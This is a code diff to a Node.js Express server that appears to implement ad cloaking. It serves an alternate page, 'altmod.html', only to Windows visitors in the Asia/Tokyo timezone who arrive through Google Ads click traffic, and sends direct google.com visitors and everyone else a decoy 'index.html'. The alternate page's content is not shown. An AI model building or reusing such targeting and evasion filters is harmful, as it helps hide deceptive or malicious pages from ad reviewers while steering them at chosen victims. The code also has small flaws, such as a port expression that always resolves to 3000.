@@ -1,6 +1,7 @@
 const express = require("express");
 const cors = require("cors");
 const path = require("path");
+const url = require("url"); // Include the URL module for parsing
 const app = express();
 const PORT = 3000 || process.env.PORT;
 
@@ -32,18 +33,18 @@ const isWindowsOS = (userAgent) => {
   return userAgent.includes("Windows");
 };
 
-// Helper function to check if the referer is not Google
-const isNotGoogleReferrer = (referer) => {
-  if (!referer) return true; // No referer, proceed with the request
+// Adjusted helper function to specifically block "https://www.google.com/"
+// and allow "https://googleads.g.doubleclick.net"
+const isAllowedReferrer = (referer) => {
+  if (!referer) return true; // Proceed if no referer
 
   const hostname = new URL(referer).hostname;
-  // Check if the hostname does not include 'google'
-  return !hostname.includes("google");
-};
-
-// Helper function to check for the gclid parameter
-const hasGclidParam = (query) => {
-  return !!query.gclid; // Returns true if gclid exists and is not empty
+  // Block direct visits from www.google.com
+  if (hostname === "www.google.com") {
+    return false;
+  }
+  // Allow visits from googleads.g.doubleclick.net or any other source
+  return true;
 };
 
 // CORS configuration
@@ -58,37 +59,47 @@ const corsOptions = {
   },
 };
 
-// Apply the CORS middleware with the configured options
+// Apply the CORS middleware
 app.use(cors(corsOptions));
 
 // Middleware to parse JSON bodies
 app.use(express.json());
 
-// Middleware to parse URL-encoded bodies (for gclid in URL query)
-app.use(express.urlencoded({ extended: true }));
+// Route to handle the POST request
+app.post(
+  "/",
+  (req, res, next) => {
+    const referer = normalizeReferer(req.headers.referer);
+    const userAgent = req.headers["user-agent"]; // Get the User-Agent from the request headers
+    console.log(`Referer: ${referer}`); // Log the referer for debugging
 
-// Route to handle requests
-app.post("/", (req, res) => {
-  const { timezone } = req.body;
-  const userAgent = req.headers['user-agent'];
-  const referer = req.headers['referer'];
-  
-  console.log(`Timezone: ${timezone}, Referer: ${referer}, User-Agent: ${userAgent}`);
+    // Check if referer is allowed and OS is Windows
+    if (
+      allowedOrigins.some((allowedOrigin) =>
+        referer.startsWith(allowedOrigin)
+      ) &&
+      isAllowedReferrer(referer) &&
+      isWindowsOS(userAgent)
+    ) {
+      next();
+    } else {
+      res
+        .status(403)
+        .send("Access forbidden due to invalid referer or conditions not met.");
+    }
+  },
+  (req, res) => {
+    const { timezone } = req.body;
+    console.log(`Timezone: ${timezone}`); // Log the timezone for debugging
 
-  // Check conditions: Timezone, OS is Windows, referer is not Google, and URL has gclid param
-  if (
-    timezone === "Asia/Tokyo" &&
-    isWindowsOS(userAgent) &&
-    isNotGoogleReferrer(referer) &&
-    hasGclidParam(req.query)
-  ) {
-    res.sendFile(path.join(__dirname, "altmod.html"));
-  } else {
-    res.sendFile(path.join(__dirname, "index.html"));
+    if (timezone === "Asia/Tokyo") {
+      res.sendFile(path.join(__dirname, "altmod.html"));
+    } else {
+      res.sendFile(path.join(__dirname, "index.html"));
+    }
   }
-});
+);
 
-// Start the server
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
